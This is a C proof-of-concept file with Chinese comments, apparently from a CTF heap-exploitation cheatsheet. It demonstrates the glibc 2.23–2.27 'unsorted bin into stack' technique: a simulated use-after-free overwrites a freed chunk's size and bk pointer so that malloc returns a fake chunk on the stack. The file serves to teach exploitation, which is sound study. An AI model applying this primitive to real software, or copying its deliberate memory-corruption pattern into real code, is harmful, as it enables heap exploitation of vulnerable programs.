/*
 * 中文导读（CTF 版）
 *
 * 手法：unsorted_bin_into_stack
 * 文件标注范围：2.23 ~ 2.27
 * 模拟漏洞：用一次 UAF 改写 unsorted chunk 的 bk 指针，并在目标附近提前
 * 布置好一个伪造的 size 字段。2.26/2.27 已经引入了 tcache，所以这里用
 * request=0x410（对应物理 size=0x420）分配，可以直接绕过它。
 * 核心流程：让 unsorted 链把栈上的 fake chunk 当成候选节点，再用大小
 * 匹配的请求把它取出来。
 * 成功判据：malloc 返回一个栈地址；2.28 引入的 unsorted bck->fd 检查
 * 会让本 PoC 失效。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <assert.h>

int main() {
	setbuf(stdout, NULL);
	intptr_t stack_buffer[4] = {0};

	intptr_t* victim = malloc(0x410);

	malloc(0x410); // 保护块防止 victim 与 top 合并。

	free(victim);

	stack_buffer[1] = 0x410 + 0x10;
	stack_buffer[3] = (intptr_t)stack_buffer;

	// ---------------- 漏洞模拟开始：改写 victim 的 size 与 bk 字段。 ----------------
	victim[-1] = 32;
	victim[1] = (intptr_t)stack_buffer; // 让 victim->bk 指向栈上的伪 chunk，这样下一次分配沿着伪链走就会返回栈地址。
	//------------------------------------

	char *p2 = malloc(0x410);

	/*
	 * 上游的旧示例还会继续覆盖 main 的返回地址来模拟"跳 shellcode"，但那样
	 * 会让 PoC 是否成功依赖具体的编译器栈布局，而且被破坏的 unsorted 链
	 * 可能在 exit 刷新 stdio 时又一次触发 malloc。这份 cheatsheet 只验证
	 * bin 原语本身：这次 malloc 确实返回了 fake chunk 的 user area 就足够
	 * 说明问题。后面用 _Exit 退出，是为了避免退出清理流程误用这条已经
	 * 故意损坏的链。
	 */
	assert(p2 == (char *)&stack_buffer[2]);
	puts("[+] unsorted：栈伪块命中");
	_Exit(0);
}
